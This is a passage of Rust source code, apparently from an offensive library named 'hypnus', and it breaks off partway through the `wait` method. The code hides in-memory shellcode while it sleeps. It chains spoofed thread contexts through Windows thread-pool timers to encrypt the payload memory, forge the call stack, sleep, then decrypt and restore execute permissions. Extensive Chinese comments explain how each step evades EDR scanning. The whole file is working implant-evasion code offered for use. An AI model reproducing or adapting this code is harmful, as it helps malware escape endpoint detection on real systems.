use alloc::string::String;
use core::{ffi::c_void, mem::zeroed, ptr::null_mut};

use uwd::AsPointer;
use anyhow::{Result, bail};
use obfstr::{obfstr as obf, obfstring as s};
use dinvk::winapis::{
    NtCurrentProcess,
    NtCurrentThread,
    NT_SUCCESS
};
use dinvk::types::{
    LARGE_INTEGER, CONTEXT,
    EVENT_ALL_ACCESS, EVENT_TYPE, 
    NTSTATUS
};

use crate::{types::*, winapis::*};
use crate::config::{Config, init_config, current_rsp};
use crate::gadget::GadgetContext;
use crate::allocator::HypnusHeap;

/// Initiates execution obfuscation using the `TpSetTimer`.
///
/// # Example
/// 
/// ```
/// #![no_std]
/// #![no_main]
///
/// extern crate alloc;
/// 
/// use hypnus::{foliage, ObfMode};
/// use hypnus::allocator::HypnusHeap;
/// use core::ffi::c_void;
/// 
/// #[global_allocator]
/// static ALLOCATOR: HypnusHeap = HypnusHeap;
/// 
/// // Pointer to the memory region you want to obfuscate (e.g., shellcode)
/// let data = b"\x90\x90\x90\xCC";
/// let ptr = data.as_ptr() as *mut c_void;
/// let size = data.len() as u64;
///
/// // Sleep duration in seconds
/// let delay = 5;
/// loop {
///     // Full obfuscation with heap encryption and RWX memory protection
///     timer!(ptr, size, delay, ObfMode::Heap | ObfMode::Rwx);
/// }
/// ```
#[macro_export]
macro_rules! timer {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Timer, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Timer, 
            $mode
        )
    };
}

/// Initiates execution obfuscation using the `TpSetWait`.
///
/// # Example
/// 
/// ```
/// #![no_std]
/// #![no_main]
///
/// extern crate alloc;
/// 
/// use hypnus::{foliage, ObfMode};
/// use hypnus::allocator::HypnusHeap;
/// use core::ffi::c_void;
/// 
/// #[global_allocator]
/// static ALLOCATOR: HypnusHeap = HypnusHeap;
/// 
/// // Pointer to the memory region you want to obfuscate (e.g., shellcode)
/// let data = b"\x90\x90\x90\xCC";
/// let ptr = data.as_ptr() as *mut c_void;
/// let size = data.len() as u64;
///
/// // Sleep duration in seconds
/// let delay = 5;
/// loop {
///     // Full obfuscation with heap encryption and RWX memory protection
///     wait!(ptr, size, delay, ObfMode::Heap | ObfMode::Rwx);
/// }
/// ```
#[macro_export]
macro_rules! wait {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Wait, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Wait, 
            $mode
        )
    };
}

/// Initiates execution obfuscation using the `NtQueueApcThread`.
///
/// # Example
/// 
/// ```
/// #![no_std]
/// #![no_main]
///
/// extern crate alloc;
/// 
/// use hypnus::{foliage, ObfMode};
/// use hypnus::allocator::HypnusHeap;
/// use core::ffi::c_void;
/// 
/// #[global_allocator]
/// static ALLOCATOR: HypnusHeap = HypnusHeap;
/// 
/// // Pointer to the memory region you want to obfuscate (e.g., shellcode)
/// let data = b"\x90\x90\x90\xCC";
/// let ptr = data.as_ptr() as *mut c_void;
/// let size = data.len() as u64;
///
/// // Sleep duration in seconds
/// let delay = 5;
/// loop {
///     // Full obfuscation with heap encryption and RWX memory protection
///     foliage!(ptr, size, delay, ObfMode::Heap | ObfMode::Rwx);
/// }
/// ```
#[macro_export]
macro_rules! foliage {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Foliage, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Foliage, 
            $mode
        )
    };
}

/// Enumeration of supported memory obfuscation strategies.
pub enum Obfuscation {
    /// The technique using Windows thread pool (`TpSetTimer`).
    Timer,

    /// The technique using Windows thread pool (`TpSetWait`).
    Wait,

    /// The technique using APC (`NtQueueApcThread`).
    Foliage,
}

/// Represents bit-by-bit options for performing obfuscation in different modes
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(transparent)]
pub struct ObfMode(pub u32);

impl ObfMode {
    /// No additional obfuscation modes are used.
    /// 
    /// 0b0000:0b是二进制字面量标志;0000是u32的低4位,即这里只使用了低4位
    pub const None: Self = ObfMode(0b0000);

    /// Enables heap encryption.
    pub const Heap: Self = ObfMode(0b0001);

    /// Allows RWX protected memory regions.
    pub const Rwx: Self = ObfMode(0b0010);

    /// Checks whether the flag contains another `ObfMode`.
    /// 位与操作,这里因为只使用了低4位,所以重载了|操作符.如果self包含other所有位,self&other结果等于other本身;用于位计算
    fn contains(self, other: ObfMode) -> bool {
        (self.0 & other.0) == other.0
    }
}

/// 操作符 | 的重载
impl core::ops::BitOr for ObfMode {
    type Output = Self;

    /// Combines two `ObfMode` flags using bitwise OR.
    fn bitor(self, rhs: Self) -> Self::Output {
        // self.0是结构体内部u32数据
        // ObfMode::Heap | ObfMode::Rwx=ObfMode(ObfMode::Heap.0 | ObfMode::Rwx.0)
        ObfMode(self.0 | rhs.0)
    }
}

/// Structure responsible for centralizing memory obfuscation techniques
/// 
/// 将指定代码段(base,size表示)
#[derive(Clone, Copy, Debug)]
struct Hypnus {
    /// Base memory pointer to be manipulated or operated on.用户想要混淆的内存区域的首地址指针
    base: u64,

    /// Size of the memory region.
    size: u64,

    /// Delay time in seconds.
    time: u64,

    /// Resolved WinAPI functions required for execution.
    cfg: &'static Config,

    /// Obfuscation modes.
    mode: ObfMode,
}
 
impl Hypnus {
    /// Creates a new `Hypnus`.
    #[inline]
    fn new(base: u64, size: u64, time: u64, mode: ObfMode) -> Result<Self> {
        if base == 0 || size == 0 || time == 0 {
            bail!(s!("invalid arguments"))
        }

        Ok(Self {
            base,
            size,
            time,
            mode,
            cfg: init_config()?,
        })
    }

    /// Performs memory obfuscation using a thread-pool timer sequence.
    fn timer(&mut self) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use
            let heap = self.mode.contains(ObfMode::Heap);
            // 指定内存权限
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Initialize two synchronization events:创建两个anonymous内核事件对象,作为跨线程池同步的信号,用于控制寄存器快照\混淆链启动等关键阶段的先后执行顺序

            // 栈上预留三个数组位置(实际使用两个),用于接收从内核传回的事件句柄
            let mut events = [null_mut(); 3];
            for event in &mut events {
                let status = NtCreateEvent(
                    // 输出:内核创建成功的对象地址存放处
                    event,
                    //  
                    EVENT_ALL_ACCESS, 
                    // 对应原型函数参数objectattributes:传空代表该事件是anonymous的.EDR对有名事件在扫描全局对象目录时很容易发现.anonymous对象只存于当前进程句柄表,隐匿性最高
                    null_mut(), 
                    // 设置为有信号的通知型事件:会一直保持有信号状态,直到被重置(在hypnus的异步链中,一个事件可能被多个context同时等待,通知型事件能确保所有监听者都能收到信号)
                    EVENT_TYPE::NotificationEvent, 
                    // 对应原型参数InitialState.初始状态为无信号,意味这所有等待这些事件的线程都会立即进入挂起状态,直到后续指令再给他发信号
                    0
                );
                
                if !NT_SUCCESS(status) {
                    bail!(s!("NtCreateEvent Failed"));
                }
            }

            // Allocate dedicated threadpool with one worker

            // 指向TP_POOL的句柄:是整个线程池的根,后续所有线程数量/栈大小都通过整个pool指针进行挂载
            let mut pool = null_mut();

            // 创建worker
            let mut status = TpAllocPool(&mut pool, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocPool Failed"));
            }

            // Configure threadpool stack sizes

            // 该线程池栈大小属性
            let mut stack = TP_POOL_STACK_INFORMATION { StackCommit: 0x80000, StackReserve: 0x80000 };

            // 应用/创建线程池
            status = TpSetPoolStackInformation(pool, &mut stack);
            if !NT_SUCCESS(status) {
                bail!(s!("TpSetPoolStackInformation Failed"));
            }

            // 将该线程池从并行/混乱的执行序列,设置为串行/可控的单线
            // 消除竞争
            TpSetPoolMinThreads(pool, 1);
            TpSetPoolMaxThreads(pool, 1);

            // Prepare callback environment
            // 回调函数的执行上下文,用于任务和指定pool池的绑定.确保混淆链条在构造的物理环境中运行.
            let mut env = TP_CALLBACK_ENVIRON_V3 { Pool: pool, ..Default::default() };

            // Capture the current thread context

            // 用作定时器handle(TpSetTimer)
            let mut timer_ctx = null_mut();

            // CONTEXT_FULL,记录cpu全貌
            // win64下,P1Home-P6Home是shadow space.P1Home就是rcx.后续当trampoline执行jmp [rcx],由于rcx指向ctx_init.rcx取出来的值就是p1home内容.结果cpu就跳进RtlCaptureContext
            // 这里只申请内存并预设捕获用到的函数,没有实际捕获状态
            // 主线程在自己stack上开辟了1.2k空间,根据sizeof(CONTEXT)算出来的,没有显式allcoc
            // ctx_init 是一个物理存在的 CONTEXT结构体实例，其核心作用是作为异步获取的 “原始线程状态模板”.即一个硬件状态容器,显示通过异步调用从os偷到合法的线程指纹,随后将其作为蓝图分发给后续的混淆步骤
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                // 这里仍处于impl Hypnus中,因此self为Hypnus结构体
                // rtl_capture_context=RtlCaptureContext
                P1Home: self.cfg.
                rtl_capture_context.as_u64(),
                ..Default::default()
            };

            // The trampoline is needed because thread pool passes the parameter in RDX, not RCX.要回调RtlCaptureContext,它的第一个参数对应的是线程池唤醒的rdx(即第二参数),所以需要trampoline将rdx移入rcx
            // 1.唤醒线程池(TpSetTimer)
            // The trampoline moves RDX to RCX and jumps to CONTEXT.P1Home (RtlCaptureContext),
            // ensuring a clean transition with no extra instructions before context capture.

            // 在windows内存中注册一个定时器任务对象.TpAllocTimer是纯内存操作,再堆里填好结构体,拿到一个句柄.但任务不会执行,内核甚至不知道它的存在.
            //TpSetTimer才是提交任务.实质是内核系统调用,将TpAllocTimer产生的句柄交给内核的任务队列。只有执行了这一步，内核才会开始倒计时，并在时间到期时通过 IOCP 唤醒线程
            // TpAllocTimer物理实质:：在当前进程的堆内存中，开辟一块空间，填充一个_TP_TIMER 结构体
            status = TpAllocTimer(
                // 输出参数,内核把新创建的的定时器对象TP_TIMER的物理内存地址填入
                &mut timer_ctx, 
                // 垫片(跳到这个地址执行)
                self.cfg.trampoline as *mut c_void, 
                // 堆栈上定义的CONTEXT
                &mut ctx_init as *mut _ as *mut c_void, 
                // 执行环境TP_CALLBACK_ENVIRON_V3.这个任务属于哪个线程池（env）
                &mut env
            );
            
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocTimer [RtlCaptureContext] Failed"));
            }

            // LARGE_INTEGER win特有的64位的union:用于表示超大整数.是win处理系统事件/性能计数的唯一标准
            // core::mem::zero,将该64位内存全部刷为0,防止被之前脏数据干扰
            let mut delay = zeroed::<LARGE_INTEGER>();

            // win内核的时间精度是100纳秒(1ms毫秒=1000us微秒;1us=10*100纳秒).1ms=10000个100纳秒单位.即100i64 * 10_000表示100ms
            // win下,正数代表绝对时间,从1601年1月1日起算的总刻度;负数代表相对时间,从现在起算.
            // 这里代表100ms后执行
            delay.QuadPart = -(100i64 * 10_000);

            // 唤醒线程
            TpSetTimer(
                // 输出参数,在调用TpSetTimer前,已经被TpAllocTimer填入
                timer_ctx, 
                // 唤醒时刻
                &mut delay, 
                // 周期msperiod,0代表是one-shot单次触发任务;
                0, 
                // msWindowLength - 时间窗口:允许系统延迟执行的宽限期.0代表只要倒计时一归零，必须立刻发送唤醒信号(实际执行中受硬件时钟终端频率限制(一般15.6ms),除非使用timeBeginPeriod修改系统时钟频率)
                0);

            // Signal after RtlCaptureContext finishes
            // 初始化新定时器对象TP_TIMER槽位.这里负责发送完成的信号
            let mut timer_event = null_mut();
            //
            status = TpAllocTimer(
                // 第二个定时器handle
                &mut timer_event,

                // win api:将事件对象从无信号转为有信号 
                // 如何从外部链接到本项目的?
                NtSetEvent2 as *mut c_void,

                //  函数开头创建的第一个事件handle
                // 1. events[0]->TpAllocTimer;2. 定时器触发-> events[0] 被塞进 CPU 的 RDX 寄存器;3. NtSetEvent2 被调用 -> 它用 RDX中的handle,去内核
                events[0], 
                &mut env
            );
            
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocTimer [NtSetEvent] Failed"));
            }

            delay.QuadPart = -(200i64 * 10_000);
            TpSetTimer(timer_event, &mut delay, 0, 0);
            // 以上,设置两个定时器.因为RtlCaptureContext快照后,直接返回,线程继续休眠.第二个定时器设为200ms,去点亮events[0]


            // Wait for context capture to complete
            // 将当前线程陷入休眠,直到指定信号出现
            status = NtWaitForSingleObject(
                // 等待的对象
                events[0],
                // 是否可被其他中断唤醒
                0, 
                // 等待时常
                null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtWaitForSingleObject Failed"));
            }

            // Build multi-step spoofed CONTEXT chain
            // 根据上面获取的快照ctx_init,伪造10份.CONTEXT derive copy,这里在内存执行了10此memcpy.即创建了10个一样的执行环境,每个都有该线程池的线程的原始寄存器状态
            let mut ctxs = [ctx_init; 10];

            // 将10个ctx_init的rax设为Ntcontinue;且栈变小
            for ctx in &mut ctxs {
                // 将context中rax设为NtContinue的地址(ntdll中的api).
                // NtContinue接收一个context,强迫cpu变成context描述的状态
                ctx.Rax = self.cfg.nt_continue.as_u64();
                ctx.Rsp -= 8;
            }

            // Duplicate thread handle for context manipulation
            let mut h_thread = null_mut();

            // NtDuplicateObject,内核提供的handle克隆api.在内核句柄表(handle table)中,创建新索引条目,该条目指向一个存在的内核对象.可以跨进程克隆句柄,可以在同一进程中将受限/临时的句柄转为永久/有完全访问权限的实体句柄
            // 其核心功能是将源进程表中的一个对象句柄索引，在目标进程（或同进程）的句柄表中创建一个新的有效条目，并根据权限掩码（ACCESS_MASK）赋予其相应的访问能力
            // 在该项目中，此函数的作用是将当前线程的“伪句柄（Pseudo-handle）”转换为具备完整访问权限的“真实内核对象句柄”，从而为后续进行 APC注入和上下文操作提供合法且高权限的访问载体
            status = NtDuplicateObject(
                // 源进程
                NtCurrentProcess(),
                // 源对象
                NtCurrentThread(),
                // 目标进程
                NtCurrentProcess(),
                // 目标对象
                &mut h_thread,
                // 期望权限
                0,
                // 句柄属性
                0,
                // 复刻源的所有权利
                DUPLICATE_SAME_ACCESS,
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtDuplicateObject Failed"));
            }

            // Base CONTEXT for spoofing
            ctx_init.Rsp = current_rsp();

            // ctx_init是payload.spoof_context不是针对某个函数/payload的伪造栈,而是伪造了整个回溯链
            // EDR回溯的起点是rsp指向的栈槽位,即使rip里是payload地址,也不影响伪造栈.即,这里从payload之后开始一直伪装到回溯的根部
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // The chain will wait until `event` is signaled
            // 将该伪造栈帧的 RIP 设置为系统函数NtWaitForSingleObject 的地址。即当该栈帧被“加载”到 CPU时，它就像是一个系统调用
            //  jmp内部调用Gadget::new,在三个dll中搜索预设的jmp <reg>机器码;jmp内部调用apply()将找到的物理地址与目标api注入到CPONTEXT和寄存器中
            ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
            ctxs[0].Rcx = events[1] as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8  = 0;

            // Temporary RW access;将原本r/x的shellcode内存转为rw读写状态
            let mut old_protect = 0u32;
            // 将全局配置拷贝到当前栈帧.因为NtProtectVirtualMemor要求传入的是变量地址(指针的指针).且会为了对齐页面边界动态修改这两个变量的值
            let (mut base, mut size) = (self.base, self.size);
            // 
            ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            // 这里的base不是shellcode的地址,是存放shellcode地址的那个变量的地址(即&base).因为NT API 需要能够修改base值对齐内存页
            // 在Trait Asu64中,重新定义的as_u64()方法,以契合此处Nt api的参数要求
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8  = size.as_u64();
            // shellcode通常以 PAGE_EXECUTE_READ 运行,下一步要执行XOR加密就必须把内存改为write.否则会触发access violation导致蓝屏
            ctxs[1].R9  = PAGE_READWRITE as u64;
            // NtProtectVirtualMemory 有 5 个参数,后续有通过((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64())在栈上读取第五个参数的代码

            // Encrypt region
            // 利用系统自带加密函数SystemFunction040对指定内存加密.发生在ctx[1]修改内存权限为rw之后,在ctxs[5]进入休眠之前
            // 这里并没有调用call指令,只修改ctxs[2].真正在加密执行在后续NtContinue时,由cpu在执行流切换中自动完成
            ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
            // 指向需要加密的payload起始地址(base)
            ctxs[2].Rcx = base;
            // 加密长度(必须8字节对齐,是api原型的硬性要求)但这里并没有对size进行8倍数的检查.(let aligned_size = (size + 7) & !7;)
            ctxs[2].Rdx = size;
            // 对应RTL_ENCRYPT_OPTION_SAME_PROCESS。表示加密后的数据仅能在当前进程内解密
            ctxs[2].R8  = 0;

            // Backup context:备份当前线程的状态
            let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            // jmp函数将ctxs[3]的rip指向一个系统合法(三个dll)的gadget,并预设下一条目标为NtThreadContext:进程读取指定线程的cpu寄存器快照(该函数rcx参数为线程句柄;rdx参数为CONTEXT类型)
            // 必须使用NtThreadContext,这时唯一能获取包括rsp/eflags(状态位)在内,能够完整描述一个线程状态的官方接口
            (&mut ctxs[3]).jmp(self.cfg, self.cfg.nt_get_context_thread.into());
            ctxs[3].Rcx = h_thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // Inject spoofed context
            // NtSetContextThread是SetThreadContext的底层系统调用:允许一个进程强制重写指定线程的cpu寄存器状态.内核强行修改cpu硬件层面的寄存器值,使得线程在下一次cpu时钟周期恢复执行时,直接变为提供的新状态
            ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[4].Rcx = h_thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // Sleep
            // 在ctxs[4]植入了ctx_spoof,在整个休眠时间线程栈:WaitForSingleObject ->RtlUserThreadStart -> ……
            // 在ctxs[2],payload已经加密.
            // 现在内存是加密的,栈是伪造的,线程处于合法的等待状态.任何扫描器来扫内存在此刻也是失明的.
            // 在spoof之后执行,线程现在带着伪造的栈帧运行,此时调用WaitForSingleObject,其产生的栈回溯是伪造的系统栈过程
            // DWORD WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
            ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
            // 当前线程handle,让线程等待自己结束.即休眠.通常线程只有在结束terminate时才会变为有信号状态.让线程等待一个永远不会在休眠期间发生的信号,强制利用超时机制来达到sleep.WaitForSingleObject是系统常见行为,而直接sleep是edr检测重点.
            ctxs[5].Rcx = h_thread as u64;
            // 休眠时间毫秒
            ctxs[5].Rdx = self.time * 1000;
            // 清零保证r8环境
            ctxs[5].R8  = 0;

            // Decrypt region:休眠期加密的payload内存,恢复为可执行的原始状态
            // SystemFunction041 (即 RtlDecryptMemory) 
            ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
            // 指向需要解密的payload起始地址
            ctxs[6].Rcx = base;
            // 解密长度,必须与加密时size一致且8字节对齐
            ctxs[6].Rdx = size;
            // 对应SAME_PROCESS,确保使用与加密时相同的内核密钥进行还原
            ctxs[6].R8  = 0;

            // Restore修复/还原 protection
            // 利用NtProtectVirtualMemory,将之前为了加密改为RW权限的内存区域,还原回原始可执行权限
            // 将ctxs[7].rip设置为一个合法的jmp <reg>的GadGet地址;将NtProtectVirtualMemory 的真实地址注入到该 Gadget使用的寄存器中(rax或r11).这种方式避免直接call敏感的syscall,通过合法的jmp指令间接跳转
            ctxs[7].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            // NtCurrentProcess()返回伪句柄-1,代表当前进程
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            // 
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8  = size.as_u64();
            // 对应权限在Obfmode::Rwx中
            ctxs[7].R9  = protection;
            // 还有第五个参数在后面设置

            // Restore thread context
            // NtSetContextThread 是内核级系统调用，通过强制重写 CPU硬件寄存器，将指定线程的执行状态瞬间切换至预设的上下文环境
            // 执行shellcode之后的业务代码
            ctxs[8].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            // h_thread时前文NtDuplicateObject获取的当前线程的真实内核句柄
            // 虽然 NtCurrentThread()（伪句柄 -2）在多数 API中可用，但在进行上下文操作时，内核通常要求提供具备THREAD_SET_CONTEXT访问权限的真实句柄，以确保操作的合法性和安全性
            ctxs[8].Rcx = h_thread as u64;
            // 提供一个 CONTEXT 结构体的指针，内核将根据该结构体中的值重置CPU 寄存器
            ctxs[8].Rdx = ctx_backup.as_u64();

            // Final event notification
            // NtSetEvent是内核级系统调用，用于将指定的内核事件对象设置为“有信号”状态，从而解除其它线程对该事件的阻塞等待
            ctxs[9].jmp(self.cfg, self.cfg.nt_set_event.into());
            // 指定要激活的同步信号:event[2]在hypnus逻辑中被定义为完成信号.此时这些这段代码的是线程池中的worker线程(或APC注入的辅助线程).通过激活该时间,向一直在NtSignalAndWaitForSingleObject 处等待的主线程（Master Thread）发送信号继续运行
            ctxs[9].Rcx = events[2] as u64;
            // 作用：接收事件在被修改之前的状态,这是一个指向 LONG 类型的指针:绝大多数同步场景下,调用者并不关心事件之前的状态.传入0/Null高速内核忽略此输出,减少不必要的内存写入操作.
            ctxs[9].Rdx = 0;
            // 这是整个CONTEXT链条的最后一环.由于hypnus的大部分操作(如加密/休眠)是在另一个上下文或线程中异步完成的,主线程依赖一种可靠的机制知道异步任务何时结束.此处ctxs[9]通过唤醒events[2],打破主线程的阻塞状态,触发hypnus.rs后续的CLeanup清理句柄和线程池代码.没有这一步主线程将陷入永久等待 deadlock

            // Layout spoofed CONTEXT chain on stack
            self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Timer)?;

            // Patch old_protect into expected return slots
            // ctxs[]中每个元素都是地址独立的1.2kb块().修改各个元素中的数据不会相互影响.主线程()在执行NtSetEvent(event[1])前,已经完成各个数组的数据加载.worker唤醒后按照顺序串行/只读的执行.无论放在哪里都不影响执行
            // 这里只是写入数据,而没有开始执行.在执行的时候,ctxs的各个数组也是串行执行的.所以即使把((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());放到后面,也不影响执行
            // 但放在这里明显有工程上的用意.必须等self.cfg.stack.spoof(...)执行后,才能拿到ctxs[1].Rsp 的最终物理数值.ctxs[1].Rsp 在不同阶段是一直变化的
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // Schedule each CONTEXT via TpSetTimer
            for ctx in &mut ctxs {
                let mut timer = null_mut();
                status = TpAllocTimer(
                    &mut timer, 
                    self.cfg.callback as *mut c_void, 
                    ctx as *mut _ as *mut c_void, 
                    &mut env
                );
                
                if !NT_SUCCESS(status) {
                    bail!(s!("TpAllocTimer Failed"));
                }

                // Add 100ms per step
                delay.QuadPart += -(100_i64 * 10_000);
                TpSetTimer(timer, &mut delay, 0, 0);
            }

            // Optional heap encryption
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait for chain completion
            status = NtSignalAndWaitForSingleObject(events[1], events[2], 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed"));
            }

            // Undo heap encryption
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Cleanup
            NtClose(h_thread);
            CloseThreadpool(pool);
            events.iter().for_each(|h| {
                NtClose(*h);
            });

            Ok(())
        }
    }

    /// Performs memory obfuscation using a thread-pool wait–based strategy.
    ///
    /// This strategy is similar to [`Hypnus::timer`], but uses `TpSetWait`
    /// instead of `TpSetTimer` to drive the spoofed CONTEXT chain.
    fn wait(&mut self) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Events used to synchronize context capture and chain completion
            let mut events = [null_mut(); 4];
            for event in &mut events {
                let status = NtCreateEvent(
                    event, 
                    EVENT_ALL_ACCESS, 
                    null_mut(), 
                    EVENT_TYPE::NotificationEvent, 
                    0
                );
                
                if !NT_SUCCESS(status) {
                    bail!(s!("NtCreateEvent Failed"));
                }
            }

            // Allocate dedicated threadpool with one worker
            let mut pool = null_mut();
            let mut status = TpAllocPool(&mut pool, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocPool Failed"));
            }

            // Configure threadpool stack sizes
            let mut stack = TP_POOL_STACK_INFORMATION { StackCommit: 0x80000, StackReserve: 0x80000 };
            status = TpSetPoolStackInformation(pool, &mut stack);
            if !NT_SUCCESS(status) {
                bail!(s!("TpSetPoolStackInformation Failed"));
            }

            TpSetPoolMinThreads(pool, 1);
            TpSetPoolMaxThreads(pool, 1);

            // Prepare callback environment
            let mut env = TP_CALLBACK_ENVIRON_V3 { Pool: pool, ..Default::default() };

            // Capture the current thread context
            let mut wait_ctx = null_mut();
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                P1Home: self.cfg.rtl_capture_context.as_u64(),
                ..Default::default()
            };

            // The trampoline is needed because thread pool passes the parameter in RDX, not RCX.
            // The trampoline moves RDX to RCX and jumps to CONTEXT.P1Home (RtlCaptureContext),
            // ensuring a clean transition with no extra instructions before context capture.
            status = TpAllocWait(
                &mut wait_ctx, 
                self.cfg.trampoline as *mut c_void, 
                &mut ctx_init as *mut _ as *mut c_void, 
                &mut env
            );

            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocWait [RtlCaptureContext] Failed"));
            }

            let mut delay = zeroed::<LARGE_INTEGER>();
            delay.QuadPart = -(100i64 * 10_000);
            TpSetWait(wait_ctx, events[0], &mut delay);

            // Signal after RtlCaptureContext finishes
            let mut wait_event = null_mut();
            status = TpAllocWait(
                &mut wait_event, 
                NtSetEvent2 as *mut c_void, 
                events[1], 
                &mut env
            );
            
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocWait [NtSetEvent] Failed"));
            }

            delay.QuadPart = -(200i64 * 10_000);
            TpSetWait(wait_event, events[0], &mut delay);

            // Wait for context capture to complete
            status = NtWaitForSingleObject(events[1], 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtWaitForSingleObject Failed"));
            }

            // Build multi-step spoofed CONTEXT chain
            let mut ctxs = [ctx_init; 10];
            for ctx in &mut ctxs {
                ctx.Rax = self.cfg.nt_continue.as_u64();
                ctx.Rsp -= 8;
            }

            // Duplicate thread handle for context manipulation
            let mut h_thread = null_mut();
            status = NtDuplicateObject(
                NtCurrentProcess(),
                NtCurrentThread(),
                NtCurrentProcess(),
                &mut h_thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtDuplicateObject Failed"));
            }

            // Base CONTEXT for spoofing
            ctx_init.Rsp = current_rsp();
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // The chain will wait until `event` is signaled
            ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
            ctxs[0].Rcx = events[2] as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8  = 0;

            // Temporary RW access
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8  = size.as_u64();
            ctxs[1].R9  = PAGE_READWRITE as u64;

            // Encrypt region
            ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size;
            ctxs[2].R8  = 0;

            // Backup context
            let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            ctxs[3].jmp(self.cfg, self.cfg.nt_get_context_thread.into());
            ctxs[3].Rcx = h_thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // Inject spoofed context
            ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[4].Rcx = h_thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // Sleep
            ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
            ctxs[5].Rcx = h_thread as u64;
            ctxs[5].Rdx = self.time * 1000;
            ctxs[5].R8  = 0;

            // Decrypt region
            ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
            ctxs[6].Rcx = base;
            ctxs[6].Rdx = size;
            ctxs[6].R8  = 0;

            // Restore protection
            ctxs[7].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8  = size.as_u64();
            ctxs[7].R9  = protection;

            // Restore thread context
            ctxs[8].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[8].Rcx = h_thread as u64;
            ctxs[8].Rdx = ctx_backup.as_u64();

            // Final event notification
            ctxs[9].jmp(self.cfg, self.cfg.nt_set_event.into());
